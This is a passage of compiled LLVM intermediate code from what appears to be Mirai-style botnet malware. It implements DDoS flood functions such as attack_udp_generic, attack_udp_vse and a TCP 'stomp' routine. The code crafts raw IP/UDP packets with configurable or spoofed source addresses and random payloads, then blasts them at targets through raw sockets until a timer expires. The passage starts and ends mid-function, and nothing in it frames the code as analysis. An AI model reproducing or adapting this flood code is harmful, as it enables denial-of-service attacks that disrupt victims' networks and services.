  %274 = call zeroext i16 @htons(i16 zeroext %273) #11
  %275 = zext i16 %274 to i32
  %276 = getelementptr inbounds i8, i8* %255, i64 24
  %277 = bitcast i8* %276 to i32*
  store i32 %275, i32* %277, align 4
  %278 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %269, i32 2
  %279 = load i32, i32* %278, align 4
  %280 = trunc i32 %279 to i16
  %281 = call zeroext i16 @htons(i16 zeroext %280) #11
  %282 = zext i16 %281 to i32
  %283 = getelementptr inbounds i8, i8* %255, i64 28
  %284 = bitcast i8* %283 to i32*
  store i32 %282, i32* %284, align 4
  %285 = getelementptr inbounds i8, i8* %255, i64 36
  %286 = bitcast i8* %285 to i16*
  store i16 0, i16* %286, align 4
  %287 = call zeroext i16 @htons(i16 zeroext %143) #11
  %288 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %256, i8* %257, i16 zeroext %287, i32 %144)
  store i16 %288, i16* %286, align 4
  %289 = getelementptr inbounds i8, i8* %255, i64 22
  %290 = bitcast i8* %289 to i16*
  %291 = load i16, i16* %290, align 2
  %292 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %269, i32 0, i32 1
  store i16 %291, i16* %292, align 2
  %293 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %269, i32 0
  %294 = bitcast %struct.sockaddr_in* %293 to %struct.sockaddr*
  %295 = call i64 @sendto(i32 %44, i8* %255, i64 %.pre-phi185, i32 16384, %struct.sockaddr* %294, i32 16) #10
  %296 = load i32, i32* %6, align 4
  %297 = add nsw i32 %296, 1
  store i32 %297, i32* %6, align 4
  %298 = icmp slt i32 %297, %50
  br i1 %298, label %.lr.ph.split.us, label %._crit_edge.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %307
  %storemerge145167 = phi i32 [ %341, %307 ], [ 0, %.lr.ph.split.preheader ]
  %299 = sext i32 %storemerge145167 to i64
  %300 = getelementptr inbounds i8*, i8** %15, i64 %299
  %301 = load i8*, i8** %300, align 8
  %302 = bitcast i8* %301 to %struct.iphdr*
  %303 = getelementptr inbounds i8, i8* %301, i64 20
  %304 = getelementptr inbounds i8, i8* %301, i64 40
  br i1 %141, label %307, label %305

; <label>:305:                                    ; preds = %.lr.ph.split
  call void @rand_alphastr(i8* %304, i32 %38)
  %306 = getelementptr inbounds i8, i8* %304, i64 %.pre-phi
  store i8 0, i8* %306, align 1
  %.pre = load i32, i32* %6, align 4
  br label %307

; <label>:307:                                    ; preds = %.lr.ph.split, %305
  %308 = phi i32 [ %storemerge145167, %.lr.ph.split ], [ %.pre, %305 ]
  %309 = getelementptr inbounds i8, i8* %301, i64 10
  %310 = bitcast i8* %309 to i16*
  store i16 0, i16* %310, align 2
  %311 = bitcast i8* %301 to i16*
  %312 = call zeroext i16 @checksum_generic(i16* %311, i32 20)
  store i16 %312, i16* %310, align 2
  %313 = sext i32 %308 to i64
  %314 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %313, i32 1
  %315 = load i32, i32* %314, align 4
  %316 = add i32 %315, 1
  store i32 %316, i32* %314, align 4
  %317 = trunc i32 %315 to i16
  %318 = call zeroext i16 @htons(i16 zeroext %317) #11
  %319 = zext i16 %318 to i32
  %320 = getelementptr inbounds i8, i8* %301, i64 24
  %321 = bitcast i8* %320 to i32*
  store i32 %319, i32* %321, align 4
  %322 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %313, i32 2
  %323 = load i32, i32* %322, align 4
  %324 = trunc i32 %323 to i16
  %325 = call zeroext i16 @htons(i16 zeroext %324) #11
  %326 = zext i16 %325 to i32
  %327 = getelementptr inbounds i8, i8* %301, i64 28
  %328 = bitcast i8* %327 to i32*
  store i32 %326, i32* %328, align 4
  %329 = getelementptr inbounds i8, i8* %301, i64 36
  %330 = bitcast i8* %329 to i16*
  store i16 0, i16* %330, align 4
  %331 = call zeroext i16 @htons(i16 zeroext %143) #11
  %332 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %302, i8* %303, i16 zeroext %331, i32 %144)
  store i16 %332, i16* %330, align 4
  %333 = getelementptr inbounds i8, i8* %301, i64 22
  %334 = bitcast i8* %333 to i16*
  %335 = load i16, i16* %334, align 2
  %336 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %313, i32 0, i32 1
  store i16 %335, i16* %336, align 2
  %337 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %313, i32 0
  %338 = bitcast %struct.sockaddr_in* %337 to %struct.sockaddr*
  %339 = call i64 @sendto(i32 %44, i8* %301, i64 %.pre-phi185, i32 16384, %struct.sockaddr* %338, i32 16) #10
  %340 = load i32, i32* %6, align 4
  %341 = add nsw i32 %340, 1
  store i32 %341, i32* %6, align 4
  %342 = icmp slt i32 %341, %50
  br i1 %342, label %.lr.ph.split, label %._crit_edge.loopexit214

._crit_edge.loopexit:                             ; preds = %263
  br label %._crit_edge

._crit_edge.loopexit214:                          ; preds = %307
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit214, %._crit_edge.loopexit, %252
  %343 = call i64 @time(i64* null) #10
  %344 = icmp sgt i64 %343, %145
  br i1 %344, label %.loopexit.loopexit, label %252

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit.loopexit215:                            ; preds = %107
  br label %.loopexit

.loopexit.loopexit216:                            ; preds = %164
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit216, %.loopexit.loopexit215, %.loopexit.loopexit, %5, %86
  ret void
}

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) local_unnamed_addr #6

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  store i32 0, i32* %6, align 4
  %7 = zext i8 %1 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 0)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 65535)
  %21 = trunc i32 %20 to i16
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 0, i32 512)
  %23 = trunc i32 %22 to i16
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 1, i32 1)
  %25 = trunc i32 %24 to i8
  %26 = load i32, i32* @LOCAL_ADDR, align 4
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 24, i32 %26)
  %28 = tail call i64 @time(i64* null) #10
  %29 = zext i32 %0 to i64
  %30 = add i64 %28, %29
  %31 = and i32 %22, 65535
  %32 = icmp ugt i32 %31, 1460
  %. = select i1 %32, i16 1460, i16 %23
  %33 = tail call i32 @socket(i32 2, i32 3, i32 17) #10
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %.loopexit, label %35

; <label>:35:                                     ; preds = %5
  store i32 1, i32* %6, align 4
  %36 = bitcast i32* %6 to i8*
  %37 = call i32 @setsockopt(i32 %33, i32 0, i32 3, i8* nonnull %36, i32 4) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %72, label %.preheader88

.preheader88:                                     ; preds = %35
  store i32 0, i32* %6, align 4
  %39 = zext i8 %1 to i32
  %40 = icmp eq i8 %1, 0
  br i1 %40, label %.preheader, label %.lr.ph90

.lr.ph90:                                         ; preds = %.preheader88
  %41 = add i16 %., 28
  %42 = icmp eq i8 %17, 0
  %43 = add i16 %., 8
  %44 = zext i8 %1 to i64
  br i1 %42, label %.lr.ph90.split.us.preheader, label %.lr.ph90.split.preheader

.lr.ph90.split.preheader:                         ; preds = %.lr.ph90
  br label %.lr.ph90.split

.lr.ph90.split.us.preheader:                      ; preds = %.lr.ph90
  br label %.lr.ph90.split.us

.lr.ph90.split.us:                                ; preds = %.lr.ph90.split.us.preheader, %.lr.ph90.split.us
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph90.split.us ], [ 0, %.lr.ph90.split.us.preheader ]
  %45 = call noalias i8* @calloc(i64 1510, i64 1) #10
  %46 = getelementptr inbounds i8*, i8** %9, i64 %indvars.iv
  store i8* %45, i8** %46, align 8
  %47 = getelementptr inbounds i8, i8* %45, i64 20
  store i8 69, i8* %45, align 4
  %48 = getelementptr inbounds i8, i8* %45, i64 1
  store i8 %11, i8* %48, align 1
  %49 = call zeroext i16 @htons(i16 zeroext %41) #11
  %50 = getelementptr inbounds i8, i8* %45, i64 2
  %51 = bitcast i8* %50 to i16*
  store i16 %49, i16* %51, align 2
  %52 = call zeroext i16 @htons(i16 zeroext %13) #11
  %53 = getelementptr inbounds i8, i8* %45, i64 4
  %54 = bitcast i8* %53 to i16*
  store i16 %52, i16* %54, align 4
  %55 = getelementptr inbounds i8, i8* %45, i64 8
  store i8 %15, i8* %55, align 4
  %56 = getelementptr inbounds i8, i8* %45, i64 9
  store i8 17, i8* %56, align 1
  %57 = getelementptr inbounds i8, i8* %45, i64 12
  %58 = bitcast i8* %57 to i32*
  store i32 %27, i32* %58, align 4
  %59 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv, i32 1
  %60 = load i32, i32* %59, align 4
  %61 = getelementptr inbounds i8, i8* %45, i64 16
  %62 = bitcast i8* %61 to i32*
  store i32 %60, i32* %62, align 4
  %63 = call zeroext i16 @htons(i16 zeroext %19) #11
  %64 = bitcast i8* %47 to i16*
  store i16 %63, i16* %64, align 2
  %65 = call zeroext i16 @htons(i16 zeroext %21) #11
  %66 = getelementptr inbounds i8, i8* %45, i64 22
  %67 = bitcast i8* %66 to i16*
  store i16 %65, i16* %67, align 2
  %68 = call zeroext i16 @htons(i16 zeroext %43) #11
  %69 = getelementptr inbounds i8, i8* %45, i64 24
  %70 = bitcast i8* %69 to i16*
  store i16 %68, i16* %70, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %71 = icmp slt i64 %indvars.iv.next, %44
  br i1 %71, label %.lr.ph90.split.us, label %..preheader_crit_edge.loopexit

; <label>:72:                                     ; preds = %35
  %73 = call i32 @close(i32 %33) #10
  br label %.loopexit

..preheader_crit_edge.loopexit:                   ; preds = %.lr.ph90.split.us
  br label %..preheader_crit_edge

..preheader_crit_edge.loopexit103:                ; preds = %.lr.ph90.split
  br label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %..preheader_crit_edge.loopexit103, %..preheader_crit_edge.loopexit
  %.lcssa91.in = phi i64 [ %indvars.iv.next, %..preheader_crit_edge.loopexit ], [ %indvars.iv.next96, %..preheader_crit_edge.loopexit103 ]
  %.lcssa91 = trunc i64 %.lcssa91.in to i32
  store i32 %.lcssa91, i32* %6, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader88, %..preheader_crit_edge
  %74 = icmp eq i32 %27, -1
  %75 = and i32 %12, 65535
  %76 = icmp eq i32 %75, 65535
  %77 = and i32 %18, 65535
  %78 = icmp eq i32 %77, 65535
  %79 = and i32 %20, 65535
  %80 = icmp eq i32 %79, 65535
  %81 = icmp eq i8 %25, 0
  %82 = zext i16 %. to i64
  %83 = add nuw nsw i64 %82, 8
  %84 = trunc i64 %83 to i32
  %85 = add nuw nsw i64 %82, 28
  %86 = zext i16 %. to i32
  %sext = shl i64 %30, 32
  %87 = ashr exact i64 %sext, 32
  br label %118

.lr.ph90.split:                                   ; preds = %.lr.ph90.split.preheader, %.lr.ph90.split
  %indvars.iv95 = phi i64 [ %indvars.iv.next96, %.lr.ph90.split ], [ 0, %.lr.ph90.split.preheader ]
  %88 = call noalias i8* @calloc(i64 1510, i64 1) #10
  %89 = getelementptr inbounds i8*, i8** %9, i64 %indvars.iv95
  store i8* %88, i8** %89, align 8
  %90 = getelementptr inbounds i8, i8* %88, i64 20
  store i8 69, i8* %88, align 4
  %91 = getelementptr inbounds i8, i8* %88, i64 1
  store i8 %11, i8* %91, align 1
  %92 = call zeroext i16 @htons(i16 zeroext %41) #11
  %93 = getelementptr inbounds i8, i8* %88, i64 2
  %94 = bitcast i8* %93 to i16*
  store i16 %92, i16* %94, align 2
  %95 = call zeroext i16 @htons(i16 zeroext %13) #11
  %96 = getelementptr inbounds i8, i8* %88, i64 4
  %97 = bitcast i8* %96 to i16*
  store i16 %95, i16* %97, align 4
  %98 = getelementptr inbounds i8, i8* %88, i64 8
  store i8 %15, i8* %98, align 4
  %99 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %100 = getelementptr inbounds i8, i8* %88, i64 6
  %101 = bitcast i8* %100 to i16*
  store i16 %99, i16* %101, align 2
  %102 = getelementptr inbounds i8, i8* %88, i64 9
  store i8 17, i8* %102, align 1
  %103 = getelementptr inbounds i8, i8* %88, i64 12
  %104 = bitcast i8* %103 to i32*
  store i32 %27, i32* %104, align 4
  %105 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv95, i32 1
  %106 = load i32, i32* %105, align 4
  %107 = getelementptr inbounds i8, i8* %88, i64 16
  %108 = bitcast i8* %107 to i32*
  store i32 %106, i32* %108, align 4
  %109 = call zeroext i16 @htons(i16 zeroext %19) #11
  %110 = bitcast i8* %90 to i16*
  store i16 %109, i16* %110, align 2
  %111 = call zeroext i16 @htons(i16 zeroext %21) #11
  %112 = getelementptr inbounds i8, i8* %88, i64 22
  %113 = bitcast i8* %112 to i16*
  store i16 %111, i16* %113, align 2
  %114 = call zeroext i16 @htons(i16 zeroext %43) #11
  %115 = getelementptr inbounds i8, i8* %88, i64 24
  %116 = bitcast i8* %115 to i16*
  store i16 %114, i16* %116, align 2
  %indvars.iv.next96 = add nsw i64 %indvars.iv95, 1
  %117 = icmp slt i64 %indvars.iv.next96, %44
  br i1 %117, label %.lr.ph90.split, label %..preheader_crit_edge.loopexit103

; <label>:118:                                    ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %40, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %118
  br i1 %74, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %151
  %storemerge8789.us = phi i32 [ %172, %151 ], [ 0, %.lr.ph.split.us.preheader ]
  %119 = sext i32 %storemerge8789.us to i64
  %120 = getelementptr inbounds i8*, i8** %9, i64 %119
  %121 = load i8*, i8** %120, align 8
  %122 = bitcast i8* %121 to %struct.iphdr*
  %123 = getelementptr inbounds i8, i8* %121, i64 20
  %124 = getelementptr inbounds i8, i8* %121, i64 28
  %125 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %119, i32 2
  %126 = load i8, i8* %125, align 4
  %127 = icmp ult i8 %126, 32
  br i1 %127, label %128, label %135

; <label>:128:                                    ; preds = %.lr.ph.split.us
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %119, i32 1
  %130 = load i32, i32* %129, align 4
  %131 = call i32 @ntohl(i32 %130) #11
  %132 = call i32 @htonl(i32 %131) #11
  %133 = getelementptr inbounds i8, i8* %121, i64 16
  %134 = bitcast i8* %133 to i32*
  store i32 %132, i32* %134, align 4
  br label %135

; <label>:135:                                    ; preds = %.lr.ph.split.us, %128
  %136 = getelementptr inbounds i8, i8* %121, i64 12
  %137 = bitcast i8* %136 to i32*
  store i32 0, i32* %137, align 4
  br i1 %76, label %138, label %141

; <label>:138:                                    ; preds = %135
  %139 = getelementptr inbounds i8, i8* %121, i64 4
  %140 = bitcast i8* %139 to i16*
  store i16 0, i16* %140, align 4
  br label %141

; <label>:141:                                    ; preds = %138, %135
  br i1 %78, label %142, label %144

; <label>:142:                                    ; preds = %141
  %143 = bitcast i8* %123 to i16*
  store i16 0, i16* %143, align 2
  br label %144

; <label>:144:                                    ; preds = %142, %141
  br i1 %80, label %145, label %148

; <label>:145:                                    ; preds = %144
  %146 = getelementptr inbounds i8, i8* %121, i64 22
  %147 = bitcast i8* %146 to i16*
  store i16 0, i16* %147, align 2
  br label %148

; <label>:148:                                    ; preds = %145, %144
  br i1 %81, label %151, label %149

; <label>:149:                                    ; preds = %148
  call void @rand_alphastr(i8* nonnull %124, i32 %86)
  %150 = getelementptr inbounds i8, i8* %124, i64 %82
  store i8 0, i8* %150, align 1
  %.pre97 = load i32, i32* %6, align 4
  br label %151

; <label>:151:                                    ; preds = %149, %148
  %152 = phi i32 [ %.pre97, %149 ], [ %storemerge8789.us, %148 ]
  %153 = getelementptr inbounds i8, i8* %121, i64 10
  %154 = bitcast i8* %153 to i16*
  store i16 0, i16* %154, align 2
  %155 = bitcast i8* %121 to i16*
  %156 = call zeroext i16 @checksum_generic(i16* %155, i32 20)
  store i16 %156, i16* %154, align 2
  %157 = getelementptr inbounds i8, i8* %121, i64 26
  %158 = bitcast i8* %157 to i16*
  store i16 0, i16* %158, align 2
  %159 = getelementptr inbounds i8, i8* %121, i64 24
  %160 = bitcast i8* %159 to i16*
  %161 = load i16, i16* %160, align 2
  %162 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %122, i8* nonnull %123, i16 zeroext %161, i32 %84)
  store i16 %162, i16* %158, align 2
  %163 = getelementptr inbounds i8, i8* %121, i64 22
  %164 = bitcast i8* %163 to i16*
  %165 = load i16, i16* %164, align 2
  %166 = sext i32 %152 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %166, i32 0, i32 1
  store i16 %165, i16* %167, align 2
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %166, i32 0
  %169 = bitcast %struct.sockaddr_in* %168 to %struct.sockaddr*
  %170 = call i64 @sendto(i32 %33, i8* nonnull %121, i64 %85, i32 16384, %struct.sockaddr* %169, i32 16) #10
  %171 = load i32, i32* %6, align 4
  %172 = add nsw i32 %171, 1
  store i32 %172, i32* %6, align 4
  %173 = icmp slt i32 %172, %39
  br i1 %173, label %.lr.ph.split.us, label %._crit_edge.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %204
  %storemerge8789 = phi i32 [ %225, %204 ], [ 0, %.lr.ph.split.preheader ]
  %174 = sext i32 %storemerge8789 to i64
  %175 = getelementptr inbounds i8*, i8** %9, i64 %174
  %176 = load i8*, i8** %175, align 8
  %177 = bitcast i8* %176 to %struct.iphdr*
  %178 = getelementptr inbounds i8, i8* %176, i64 20
  %179 = getelementptr inbounds i8, i8* %176, i64 28
  %180 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %174, i32 2
  %181 = load i8, i8* %180, align 4
  %182 = icmp ult i8 %181, 32
  br i1 %182, label %183, label %190

; <label>:183:                                    ; preds = %.lr.ph.split
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %174, i32 1
  %185 = load i32, i32* %184, align 4
  %186 = call i32 @ntohl(i32 %185) #11
  %187 = call i32 @htonl(i32 %186) #11
  %188 = getelementptr inbounds i8, i8* %176, i64 16
  %189 = bitcast i8* %188 to i32*
  store i32 %187, i32* %189, align 4
  br label %190

; <label>:190:                                    ; preds = %.lr.ph.split, %183
  br i1 %76, label %191, label %194

; <label>:191:                                    ; preds = %190
  %192 = getelementptr inbounds i8, i8* %176, i64 4
  %193 = bitcast i8* %192 to i16*
  store i16 0, i16* %193, align 4
  br label %194

; <label>:194:                                    ; preds = %191, %190
  br i1 %78, label %195, label %197

; <label>:195:                                    ; preds = %194
  %196 = bitcast i8* %178 to i16*
  store i16 0, i16* %196, align 2
  br label %197

; <label>:197:                                    ; preds = %195, %194
  br i1 %80, label %198, label %201

; <label>:198:                                    ; preds = %197
  %199 = getelementptr inbounds i8, i8* %176, i64 22
  %200 = bitcast i8* %199 to i16*
  store i16 0, i16* %200, align 2
  br label %201

; <label>:201:                                    ; preds = %198, %197
  br i1 %81, label %204, label %202

; <label>:202:                                    ; preds = %201
  call void @rand_alphastr(i8* %179, i32 %86)
  %203 = getelementptr inbounds i8, i8* %179, i64 %82
  store i8 0, i8* %203, align 1
  %.pre = load i32, i32* %6, align 4
  br label %204

; <label>:204:                                    ; preds = %201, %202
  %205 = phi i32 [ %storemerge8789, %201 ], [ %.pre, %202 ]
  %206 = getelementptr inbounds i8, i8* %176, i64 10
  %207 = bitcast i8* %206 to i16*
  store i16 0, i16* %207, align 2
  %208 = bitcast i8* %176 to i16*
  %209 = call zeroext i16 @checksum_generic(i16* %208, i32 20)
  store i16 %209, i16* %207, align 2
  %210 = getelementptr inbounds i8, i8* %176, i64 26
  %211 = bitcast i8* %210 to i16*
  store i16 0, i16* %211, align 2
  %212 = getelementptr inbounds i8, i8* %176, i64 24
  %213 = bitcast i8* %212 to i16*
  %214 = load i16, i16* %213, align 2
  %215 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %177, i8* %178, i16 zeroext %214, i32 %84)
  store i16 %215, i16* %211, align 2
  %216 = getelementptr inbounds i8, i8* %176, i64 22
  %217 = bitcast i8* %216 to i16*
  %218 = load i16, i16* %217, align 2
  %219 = sext i32 %205 to i64
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %219, i32 0, i32 1
  store i16 %218, i16* %220, align 2
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %219, i32 0
  %222 = bitcast %struct.sockaddr_in* %221 to %struct.sockaddr*
  %223 = call i64 @sendto(i32 %33, i8* %176, i64 %85, i32 16384, %struct.sockaddr* %222, i32 16) #10
  %224 = load i32, i32* %6, align 4
  %225 = add nsw i32 %224, 1
  store i32 %225, i32* %6, align 4
  %226 = icmp slt i32 %225, %39
  br i1 %226, label %.lr.ph.split, label %._crit_edge.loopexit102

._crit_edge.loopexit:                             ; preds = %151
  br label %._crit_edge

._crit_edge.loopexit102:                          ; preds = %204
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit102, %._crit_edge.loopexit, %118
  %227 = call i64 @time(i64* null) #10
  %228 = icmp sgt i64 %227, %87
  br i1 %228, label %.loopexit.loopexit, label %118

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %5, %72
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i32 0, i32* %6, align 4
  %8 = zext i8 %1 to i64
  %9 = tail call noalias i8* @calloc(i64 %8, i64 8) #10
  %10 = bitcast i8* %9 to i8**
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %12 = trunc i32 %11 to i8
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %14 = trunc i32 %13 to i16
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 0)
  %18 = trunc i32 %17 to i8
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 27015)
  %22 = trunc i32 %21 to i16
  store i32 0, i32* %7, align 4
  %23 = tail call i64 @time(i64* null) #10
  %24 = zext i32 %0 to i64
  %25 = add i64 %23, %24
  tail call void @table_unlock_val(i8 zeroext 36)
  %26 = call i8* @table_retrieve_val(i32 36, i32* nonnull %7)
  %27 = call i32 @socket(i32 2, i32 3, i32 17) #10
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %.loopexit, label %29

; <label>:29:                                     ; preds = %5
  store i32 1, i32* %6, align 4
  %30 = bitcast i32* %6 to i8*
  %31 = call i32 @setsockopt(i32 %27, i32 0, i32 3, i8* nonnull %30, i32 4) #10
  %32 = icmp eq i32 %31, -1
  br i1 %32, label %75, label %.preheader73

.preheader73:                                     ; preds = %29
  store i32 0, i32* %6, align 4
  %33 = zext i8 %1 to i32
  %34 = icmp eq i8 %1, 0
  br i1 %34, label %.preheader, label %.lr.ph75

.lr.ph75:                                         ; preds = %.preheader73
  %35 = icmp eq i8 %18, 0
  br i1 %35, label %.lr.ph75.split.us.preheader, label %.lr.ph75.split.preheader

.lr.ph75.split.preheader:                         ; preds = %.lr.ph75
  br label %.lr.ph75.split

.lr.ph75.split.us.preheader:                      ; preds = %.lr.ph75
  br label %.lr.ph75.split.us

.lr.ph75.split.us:                                ; preds = %.lr.ph75.split.us.preheader, %.lr.ph75.split.us
  %36 = phi i32 [ %73, %.lr.ph75.split.us ], [ 0, %.lr.ph75.split.us.preheader ]
  %37 = call noalias i8* @calloc(i64 128, i64 1) #10
  %38 = sext i32 %36 to i64
  %39 = getelementptr inbounds i8*, i8** %10, i64 %38
  store i8* %37, i8** %39, align 8
  %40 = getelementptr inbounds i8, i8* %37, i64 20
  %41 = getelementptr inbounds i8, i8* %37, i64 28
  store i8 69, i8* %37, align 4
  %42 = getelementptr inbounds i8, i8* %37, i64 1
  store i8 %12, i8* %42, align 1
  %43 = load i32, i32* %7, align 4
  %44 = trunc i32 %43 to i16
  %45 = add i16 %44, 32
  %46 = call zeroext i16 @htons(i16 zeroext %45) #11
  %47 = getelementptr inbounds i8, i8* %37, i64 2
  %48 = bitcast i8* %47 to i16*
  store i16 %46, i16* %48, align 2
  %49 = call zeroext i16 @htons(i16 zeroext %14) #11
  %50 = getelementptr inbounds i8, i8* %37, i64 4
  %51 = bitcast i8* %50 to i16*
  store i16 %49, i16* %51, align 4
  %52 = getelementptr inbounds i8, i8* %37, i64 8
  store i8 %16, i8* %52, align 4
  %53 = getelementptr inbounds i8, i8* %37, i64 9
  store i8 17, i8* %53, align 1
  %54 = load i32, i32* @LOCAL_ADDR, align 4
  %55 = getelementptr inbounds i8, i8* %37, i64 12
  %56 = bitcast i8* %55 to i32*
  store i32 %54, i32* %56, align 4
  %57 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %38, i32 1
  %58 = load i32, i32* %57, align 4
  %59 = getelementptr inbounds i8, i8* %37, i64 16
  %60 = bitcast i8* %59 to i32*
  store i32 %58, i32* %60, align 4
  %61 = call zeroext i16 @htons(i16 zeroext %20) #11
  %62 = bitcast i8* %40 to i16*
  store i16 %61, i16* %62, align 2
  %63 = call zeroext i16 @htons(i16 zeroext %22) #11
  %64 = getelementptr inbounds i8, i8* %37, i64 22
  %65 = bitcast i8* %64 to i16*
  store i16 %63, i16* %65, align 2
  %66 = add i16 %44, 12
  %67 = call zeroext i16 @htons(i16 zeroext %66) #11
  %68 = getelementptr inbounds i8, i8* %37, i64 24
  %69 = bitcast i8* %68 to i16*
  store i16 %67, i16* %69, align 2
  %70 = bitcast i8* %41 to i32*
  store i32 -1, i32* %70, align 4
  %71 = getelementptr inbounds i8, i8* %37, i64 32
  call void @util_memcpy(i8* %71, i8* %26, i32 %43)
  %72 = load i32, i32* %6, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %6, align 4
  %74 = icmp slt i32 %73, %33
  br i1 %74, label %.lr.ph75.split.us, label %.preheader.loopexit

; <label>:75:                                     ; preds = %29
  %76 = call i32 @close(i32 %27) #10
  br label %.loopexit

.preheader.loopexit:                              ; preds = %.lr.ph75.split.us
  br label %.preheader

.preheader.loopexit92:                            ; preds = %.lr.ph75.split
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit92, %.preheader.loopexit, %.preheader73
  %77 = and i32 %13, 65535
  %78 = icmp eq i32 %77, 65535
  %79 = and i32 %19, 65535
  %80 = icmp eq i32 %79, 65535
  %81 = and i32 %21, 65535
  %82 = icmp eq i32 %81, 65535
  %sext = shl i64 %25, 32
  %83 = ashr exact i64 %sext, 32
  br label %126

.lr.ph75.split:                                   ; preds = %.lr.ph75.split.preheader, %.lr.ph75.split
  %84 = phi i32 [ %124, %.lr.ph75.split ], [ 0, %.lr.ph75.split.preheader ]
  %85 = call noalias i8* @calloc(i64 128, i64 1) #10
  %86 = sext i32 %84 to i64
  %87 = getelementptr inbounds i8*, i8** %10, i64 %86
  store i8* %85, i8** %87, align 8
  %88 = getelementptr inbounds i8, i8* %85, i64 20
  %89 = getelementptr inbounds i8, i8* %85, i64 28
  store i8 69, i8* %85, align 4
